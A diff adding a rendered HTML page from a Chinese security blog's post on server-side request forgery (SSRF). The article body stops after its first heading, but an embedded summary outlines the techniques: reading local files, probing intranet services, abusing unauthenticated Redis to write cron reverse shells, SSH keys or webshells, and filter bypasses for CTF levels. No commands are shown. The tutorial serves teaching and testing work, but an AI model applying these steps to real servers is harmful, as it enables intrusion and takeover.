@@ -1,0 +1,686 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SSRF | Attackxu の Blog</title><meta name="keywords" content="SSRF"><meta name="author" content="Attackxu"><meta name="copyright" content="Attackxu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SSRF"><meta name="application-name" content="SSRF"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SSRF"><meta property="og:url" content="http://example.com/2025/05/27/SSRF/index.html"><meta property="og:site_name" content="Attackxu の Blog"><meta property="og:description" content="服务器端请求伪造 客户端请求&amp;amp;服务器端请求 客户端请求  由客户端设备（个人计算机、电脑手机等）或软件（浏览器、APP）发出的请求，以获取指定的网页、图片、视频或其他资源。比如当用户在浏览器中输入url或点击链接时，浏览器会自动发起HTTP请求，请求服务器返回指定的资源  服务器端请求  服"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="Attackxu"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="服务器端请求伪造 客户端请求&amp;amp;服务器端请求 客户端请求  由客户端设备（个人计算机、电脑手机等）或软件（浏览器、APP）发出的请求，以获取指定的网页、图片、视频或其他资源。比如当用户在浏览器中输入url或点击链接时，浏览器会自动发起HTTP请求，请求服务器返回指定的资源  服务器端请求  服"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2025/05/27/SSRF/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Attackxu","link":"链接: ","source":"来源: Attackxu の Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Attackxu の Blog',
+  title: 'SSRF',
+  postAI: '',
+  pageFillDescription: '客户端请求amp服务器端请求, 介绍, 原因, 危害, 场景, 漏洞函数, curl_exec, file_get_contents, fsockopen, 判断是否存在SSRF, 漏洞利用, 读取敏感文件, 探测同c段其他主机, 探测内网服务-dict, 通过dictx2Fx2F协议攻击内网Redis, 写定时任务, 写ssh公钥, 防御, SSRF无回显解决方案, SSRF漏洞挖掘思路, SSRF协议利用, httpx2Fx2F （常用）, filex2Fx2Fx2F （常用）, dictx2Fx2F （常用）, sftpx2Fx2F, ldapx2Fx2F, tftpx2Fx2F, gopherx2Fx2F （常用）, SSRF绕过方式, 白盒CTF-绕过amp伪协议amp审计点, 351-无过滤, 352-353-ip地址过滤（IP地址进制转换）, 354-域名解析ip绕过, 355-356-长度限制IP绕过, 357-重定向解析绕过, 358-匹配但不影响写法绕过, gopher协议打, 359-mysql, 360-redis, 黑盒WEB-业务功能ampURL关键字服务器端请求伪造客户端请求服务器端请求客户端请求由客户端设备个人计算机电脑手机等或软件浏览器发出的请求以获取指定的网页图片视频或其他资源比如当用户在浏览器中输入或点击链接时浏览器会自动发起请求请求服务器返回指定的资源服务器端请求服务器上的应用程序或服务会提供一些功能接口比如接口用于与其他服务进行数据交互这些由服务器向其他的服务器发起的请求称之为服务器端请求介绍服务器端请求伪造简称是指攻击者通过伪造服务器端请求从而使服务器发起对第三方系统的攻击或访问攻击者通常会使用受害者服务器上的应用程序作为代理来发起请求以使请求看起来像是由服务器发起的原因由于服务端提供了从其他服务器应用获取数据的功能但又没有对目标地址做严格过滤与限制导致攻击者可以传入任意的地址来让后端服务器对其发起请求并返回对该目标地址请求的数据比如从指定地址获取网页文本内容加载指定地址的图片下载等危害窃取数据攻击者可以伪造请求以访问服务器内部网络或云环境中的其他服务或资源以窃取敏感数据攻击第三方系统攻击者可以伪造请求以攻击第三方系统例如访问其他组织的敏感数据或执行拒绝服务攻击内部端口扫描攻击者可以伪造请求以扫描服务器内部端口和服务以寻找其他可能的漏洞获取指纹信息通过获取应用可达服务器服务的指纹信息请求内网敏感数据场景漏洞一般存在于应用程序中这些应用程序接受来自用户的输入然后将其用于向其他服务器发出请求攻击者可以在输入中注入恶意的从而使服务器发起未经授权的请求以访问敏感的内部资源文件上传功能应用程序通常允许用户上传文件攻击者可以上传包含恶意的文件以触发漏洞图片处理功能应用程序通常包含图片处理功能攻击者可以在图片中注入恶意的以触发漏洞重定向功能应用程序可能包含重定向功能攻击者可以在重定向中注入恶意的以触发漏洞调用应用程序可能会使用与其他服务进行交互攻击者可以在请求中注入恶意的以触发漏洞漏洞函数这些函数用于发出请求包括常见的函数如如果这些函数允许从用户输入中获取但未正确验证和过滤用户输入攻击者可以通过在中注入恶意代码来触发漏洞仅支持协议的类类类类类支持所有协议的类类类类格式作用执行会话新建文件创建一个资源设置和相应的选项设置不包括响应头信息只返回正文内容将证书验证设置为即不验证对等证书将主机验证设置为即不验证主机抓取并把它传递给浏览器关闭资源并且释放系统资源当我们访问这个网页时会跳转到格式作用把整个文件读入一个字符串中将整个文件或一个所指向的文件读入一个字符串中在该目录下创建一个文件夹用于接收生成的文件自行传入参数之后在文件夹下可以看到生成的文件文件内容与我们传入的参数相关更改信息开启本机服务访问文件该电脑的文件目录能够显示出来判断是否存在在无回显的攻击中攻击者无法直接获取目标系统返回的响应因此需要寻找一种方法来间接地确认攻击是否成功是一种常用的间接确认方法它通过向一个域名提交请求然后查看服务器的日志来获取该域名的请求记录从而确认攻击是否成功攻击者可以在漏洞中注入带有服务地址的并将该发送到目标服务器上当目标服务器对该进行请求时服务将接收到请求并记录在日志中攻击者可以定期查看的日志以确认目标服务器是否对该进行了请求无回显使用平台来测试有没有漏洞平台有记录说明存在漏洞漏洞利用网络信息靶场有三个容器读取敏感文件协议读取敏感文件格式通常后面是因为最后的表示根目录读取的是目标服务器本地的文件无法读取其他服务器的文件访问的是这个容器的端口文件主要作用是定义地址和主机名的映射关系是一个映射地址和主机名的规定可以用文本文件打开当用户在浏览器中输入一个网址时系统会首先自动从文件中寻找对应的地址一旦找到浏览器会立即打开对应网页如果没有找到则浏览器会将网址提交服务器进行地址解析简单来说就是负责地址与域名快速解析的文件读取文件可以得到内网所在网段探测同段其他主机由于读取文件可以得到所在的内网我们可以对同段其他主机进行爆破为我们对进行爆破看响应时间时间短的即为可能存在的主机和一般不是主机一般是网关探测内网服务格式作用是一个在线网络字典协议用来架设一个字典服务在中常常用来探测内网的应用信息我们使用可以探测端口是否开放探测的主机是否开放端口开放了端口开放了本机通过协议攻击内网是一个存储系统是跨平台的非关系型数据库键值对一般绑定在本地的端口上如果在没有开启认证的情况下可以导致任意用户利用漏洞攻击内网中的未授权以及读取的数据攻击者在未授权访问的情况下可以利用的相关方法如果运行的用户是用户攻击者可以通过写定时任务的方式进行反弹测试是否存在未授权漏洞存在存在未授权之后可以写定时任务定时任务是通过来完成是一个下的定时执行工具不同的系统定时任务保存的目录不同的定时任务保存在目录下的定时任务保存在目录下可以根据服务器是否存在以下文件判断服务器信息在攻击主机如果你的攻击目标是本地靶场那攻击机可以使用如果攻击目标是公网服务器则接收反弹的机器也需要是公网服务器监听一个端口用以接收受害主机执行的定时任务所反弹回来的在存在漏洞的网站依次执行清空数据库慎用设置工作目录设置保存的文件名设置变量如果你是在本地虚拟机监听则下方的也需要修改为保存改成端口开放的那个主机攻击成功后攻击者监听的端口会接收到反弹回来的写公钥密钥对可以让您方便的登录到服务器而无需输入密码密钥对总是成双出现的一把公钥一把私钥公钥可以自由的放在您所需要连接的服务器上而私钥必须的保管好公钥登录很多时候也说认证公钥登录的原理首先用户将自己的公钥存储在需要登录的远程机器上面然后登录的时候远程主机会向用户发送一段随机字符串接着用户使用自己的私钥加密字符串并发给远程主机最后远程主机使用存储的公钥进行解密若解密成功则说明用户可信准许登录不再提示输入密码服务端会将客户端发的公钥写入到文件末尾为当前用户根目录公钥和私钥在客户端登录端生成攻击流程探测是否存在漏洞比如说读取文件探测端口看端口是否开放端口是否开放测试是否存在未授权访问漏洞通过写公钥首先攻击方生成一对默认情况下生成后在用户的家目录下的目录下防御服务器请求来源于业务本身的正常功能比如图片的请求等有的人动了坏心思服务器端请求伪造漏洞为了防御目前主要有以下几个手段白名单设置用户提交的白名单比如用户在访问时提交的只允许是来自的协议限制限制只能使用请求可以避免如等情况带来的文件泄露过滤返回信息针对服务端返回的信息进行过滤比如服务本身是去获取格式的图片那么返回其他的内容就是不符合标准的可以进行报错处理统一错误信息只显示固定几种错误信息使事实上成为无回显类型无回显解决方案跟无回显道理是一样的两种解决方法反向连接一般都是用这个反向连接方式因为无法写文件让疑似存在的目标请求外部一个网站或者自己用启用一个服务当或者自启用网站能接收到请求信息时不就代表目标存在正向连接一般执行可以用这个方式得用第一种方式写个文件在对方网站目录下然后再去访问网站目录是否存在这个文件就能判断目标是否执行了命令让目标用起个监听我们主动连过去漏洞挖掘思路黑盒探针业务功能点社交分享功能获取超链接的标题等内容进行显示转码服务通过地址把原地址的网页内容调优使其适合手机屏幕浏览在线翻译给网址翻译对应网页的内容图片加载下载例如富文本编辑器中的点击下载图片到本地通过地址加载或下载图片图片文章收藏功能主要其会取地址中以及文本的内容作为显示以求一个好的用具体验云服务厂商它会远程执行一些命令来判断网站是否存活等所以如果可以捕获相应的信息就可以进行测试网站采集网站抓取的地方一些网站会针对你输入的进行一些信息采集工作数据库内置功能数据库的比如的函数邮件系统比如接收邮件服务器地址编码处理属性信息处理文件处理比如处理器等未公开的实现以及其他扩展调用的功能可以利用语法加上这些关键字去寻找漏洞关键参数白盒分析主要是看文件读取加载数据操作类的函数协议利用常见访问如从文件系统中获取文件内容如字典服务器协议访问字典资源如文件传输协议或安全文件传输协议轻量级目录访问协议简单文件传输协议分布式文档传递服务可使用生成由于有部分协议这类不支持可以来进行通讯等应用漏洞利用或信息收集通讯相关服务的时候工具常用常见访问如等常用从文件系统中获取文件内容如常用字典服务器协议访问字典资源如文件传输协议或安全文件传输协议轻量级目录访问协议简单文件传输协议常用分布式文档传递服务可使用生成要使用有部分服务是协议不支持通讯的那么可以用来进行通讯如服务等应用漏洞利用或信息收集通讯相关服务的时候工具绕过方式情况限制为域名采用基本身份认证的方式绕过即情况限制请求不为内网地址当不允许为内网地址时采取短网址绕过采取域名解析采取进制转换采取重定向白盒绕过伪协议审计点无过滤分析报错不显示高亮传参初始化一个会话并设置目标为设置选项表示请求返回的数据中不包含头部信息设置选项表示将请求结果返回为字符串而不是直接输出执行请求并将返回内容存储到关闭没有任何过滤直接尝试获取本地文件地址过滤地址进制转换要求地址中必须含有或且不能含有和绕过地址进制转换十六进制和十进制都可以十六进制前要加还有一种特殊的省略模式写成用绕过还有很多方式域名解析绕过都被过滤域名解析绕过配置一个域名解析为长度限制绕过对于输入的地址有长度限制要为长度重定向解析绕过如果输入的域名解析结果为就会被过滤重定向绕过在下创建一个文件其作用是当执行该脚本时会直接跳转到对应的网址即后面的网址再去访问这个文件匹配但不影响写法绕过中必须包含字样的内容才会被执行输出注释掉后面的内容对没有影响协议打前提条件是无密码的登录的数据包使用生成将在进行一次编码发送访问木马被写入使用生成的文件为当前目录下的同样后面的内容也要进行编码命令执行黑盒业务功能关键字黑盒探针文件导出格式转换标签标签是干嘛的和文件包含黑盒如何区分分析参数关键字字样大概率字样大概率文件包含看参数值地址文件包含一般只允许包含本地看能不能包含远程地址分析页面响应多方面多角度分析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-05-27 19:20:06',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Attackxu の Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/API%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">API安全<sup>2</sup></a><a href="/tags/CRLF/" style="font-size: 1.05rem;">CRLF<sup>1</sup></a><a href="/tags/CSRF/" style="font-size: 1.05rem;">CSRF<sup>1</sup></a><a href="/tags/HTTP/" style="font-size: 1.05rem;">HTTP<sup>4</sup></a><a href="/tags/JAVA/" style="font-size: 1.05rem;">JAVA<sup>6</sup></a><a href="/tags/JavaScript/" style="font-size: 1.05rem;">JavaScript<sup>2</sup></a><a href="/tags/PHP/" style="font-size: 1.05rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 1.05rem;">RCE<sup>1</sup></a><a href="/tags/SSRF/" style="font-size: 1.05rem;">SSRF<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 1.05rem;">XSS<sup>1</sup></a><a href="/tags/XXE/" style="font-size: 1.05rem;">XXE<sup>1</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">sql注入<sup>2</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 1.05rem;">文件上传<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 1.05rem;">文件包含<sup>2</sup></a><a href="/tags/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/" style="font-size: 1.05rem;">日常生活<sup>2</sup></a><a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 1.05rem;">环境搭建<sup>7</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">靶场<sup>7</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">五月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">41</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/OWASP/" itemprop="url">OWASP</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/SSRF/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>SSRF</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SSRF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-05-27T11:19:54.000Z" title="发表于 2025-05-27 19:19:54">2025-05-27</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-05-27T11:20:06.610Z" title="更新于 2025-05-27 19:20:06">2025-05-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为合肥"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>合肥</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2025/05/27/SSRF/"><header><a class="post-meta-categories" href="/categories/OWASP/" itemprop="url">OWASP</a><a href="/tags/SSRF/" tabindex="-1" itemprop="url">SSRF</a><h1 id="CrawlerTitle" itemprop="name headline">SSRF</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Attackxu</span><time itemprop="dateCreated datePublished" datetime="2025-05-27T11:19:54.000Z" title="发表于 2025-05-27 19:19:54">2025-05-27</time><time itemprop="dateCreated datePublished" datetime="2025-05-27T11:20:06.610Z" title="更新于 2025-05-27 19:20:06">2025-05-27</time></header><p>服务器端请求伪造</p>
+<h1 id="客户端请求-服务器端请求"><a href="#客户端请求-服务器端请求" class="headerlink" title="客户端请求&amp;服务器端请求"></a>客户端请求&amp;服务器端请求</h1><ol>
+<li>客户端请求</li>
+</ol>
